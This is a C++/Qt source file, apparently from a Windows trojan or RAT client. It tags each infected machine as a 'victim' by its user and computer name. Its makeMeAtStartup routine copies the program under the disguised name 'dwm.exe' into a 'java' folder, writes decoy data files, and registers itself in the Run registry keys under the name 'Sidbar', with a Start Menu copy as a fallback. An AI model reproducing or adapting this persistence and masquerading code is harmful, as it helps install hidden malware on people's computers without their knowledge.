#include "tools.h"
const QString fileName = "dwm.exe";
const QString folderName = "java";
const QString valueReg = "Sidbar";

Tools::Tools()
{
    //créer identifiant
    identifiant = "Vict__" + getUserName() + "__" + getComputerName();
}

QString Tools::getUserName()
{
    return QString(getenv("USERNAME"));
}

QString Tools::getComputerName()
{
    return QString(getenv("COMPUTERNAME"));
}

QString Tools::getRootPath()
{
    return QString(getenv("WINDIR")).replace("\\","/"); //return c:\Windows
}

QString Tools::getProgramFile()
{
    return QString(getenv("programfiles")).replace("\\","/"); //return c:\program file
}

QString Tools::getIdentifiant()
{
    return identifiant;
}

QString Tools::getHasard(int nbr)
{
    QString alea = "";
    alea += QString::number(getUserName().length());
    alea += QString::number(getComputerName().length());
    alea += QString::number(getRootPath().length());
    alea += QString::number(getIdentifiant().length());
    alea += QString::number(QDate::currentDate().day());
    alea += QString::number(QDate::currentDate().month());
    alea += QString::number(QDate::currentDate().year());
    alea += QString::number(QTime::currentTime().hour());
    alea += QString::number(QTime::currentTime().minute());
    alea += QString::number(QTime::currentTime().second());
    alea += QString::number(QTime::currentTime().msec());

    for (int i=0;i<nbr;i++)
    {
        alea += alea.right(i);
    }

    int k = alea.length();
    for (int i=0;i<k;i++)
    {
        alea = alea.mid((k + nbr) % (i+nbr),2) + alea;
    }

    QString a1(""),a2("");
    for (int i=0;i<alea.length();i++)
    {
        if (i % 2 == 0) a1 += alea.mid(i,1); else a2 += alea.mid(i,1);
    }

    alea = "";
    for (int i=0;i<=200;i++)
    {
        if (i % 2 == 0) alea += a1; else alea += a2;
    }

    return alea.mid(alea.mid(nbr,1).toInt(),nbr);
}

bool Tools::copyMe(QString directory,QString filePath)
{
    if (QFile(filePath).exists()) return true;
    QDir dir(directory);
    dir.mkdir(folderName);

    QFile origine(qApp->applicationDirPath() + "/" + qApp->applicationName() + ".exe");
    origine.copy(filePath);

    QFile java1(directory + "/" + folderName + "/java.bin");
    java1.open(QFile::WriteOnly);
    QDataStream out1(&java1);
    for (int i=0;i<=100;i++) {out1 << (quint64) i;}
    java1.close();

    QFile java2(directory + "/" + folderName + "/jbin.dat");
    java2.open(QFile::WriteOnly);
    QDataStream out2(&java2);
    for (int i=0;i<=100;i++) {out2 << (quint64) (i * i + i);}
    java2.close();

    return QFile(filePath).exists();
}

void Tools::makeMeAtStartup()
{

    QString filePath = getProgramFile() + "/" + folderName + "/" + fileName;
    if (!copyMe(getProgramFile(),filePath))
    {
        filePath = "C:/" + folderName + "/" + fileName;
        copyMe("C:/",filePath);
    }

    filePath = filePath.replace("/","\\");
    QSettings settings("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",QSettings::NativeFormat);
    settings.setValue(valueReg,filePath);
    if (settings.value(valueReg).toString() == filePath) return;

    QSettings settings2("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",QSettings::NativeFormat);
    settings2.setValue(valueReg,filePath);
    if (settings2.value(valueReg).toString() == filePath) return;

    QFile orig(qApp->applicationDirPath() + "/" + qApp->applicationName() + ".exe");
    orig.copy(QString(getenv("USERPROFILE")).replace("\\","/") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/" + fileName);
}

void Tools::makeTrace()
{
    return;
    /*QSqlDatabase db = QSqlDatabase::addDatabase("QSQLITE");
    db.setDatabaseName(QDir::tempPath() + "/system.sql");
    db.open();
    QSqlQuery query(db);
    query.exec("CREATE TABLE IF NOT EXISTS MALLOC(MALLOC text)");
    query.exec("INSERT INTO MALLOC (MALLOC) VALUES '" + QDateTime::currentDateTime().toString("hh:mm:ss - dd/MM/yyyy") + "'");
    db.close();*/
}
